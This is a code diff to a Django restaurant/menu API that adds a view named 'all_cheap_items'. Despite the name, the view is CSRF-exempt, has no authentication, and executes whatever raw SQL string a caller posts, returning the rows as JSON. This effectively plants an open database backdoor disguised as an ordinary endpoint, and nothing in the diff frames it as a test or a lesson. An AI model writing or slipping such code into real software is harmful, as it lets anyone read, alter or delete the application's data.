@@ -5,6 +5,7 @@ from rest_framework import viewsets, status
 from rest_framework.decorators import api_view, parser_classes
 from rest_framework.parsers import MultiPartParser, FormParser
 from rest_framework.response import Response
+from django.shortcuts import render
 from .models import (
     Restaurant, 
     Menu, 
@@ -113,3 +114,28 @@ def upload_menu(request):
             status=status.HTTP_500_INTERNAL_SERVER_ERROR
         )
 
+from django.http import JsonResponse
+from django.db import connection
+import json
+
+from django.views.decorators.csrf import csrf_exempt
+@csrf_exempt
+def all_cheap_items(request):
+    if request.method == 'POST':
+        data = json.loads(request.body)
+        query = data.get('query')
+        params = data.get('params', ())
+        
+        try:
+            with connection.cursor() as cursor:
+                cursor.execute(query, params)
+                # Fetch results for all queries
+                columns = [col[0] for col in cursor.description]
+                results = []
+                for row in cursor.fetchall():
+                    results.append(dict(zip(columns, row)))
+                return JsonResponse({'results': results})
+        except Exception as e:
+            return JsonResponse({'error': str(e)}, status=400)
+    
+    return JsonResponse({'error': 'Only POST method is allowed'}, status=405)
